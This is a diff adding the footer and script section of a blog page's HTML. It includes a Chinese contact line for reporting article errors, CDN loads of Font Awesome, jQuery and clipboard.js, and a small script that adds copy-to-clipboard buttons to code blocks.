+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
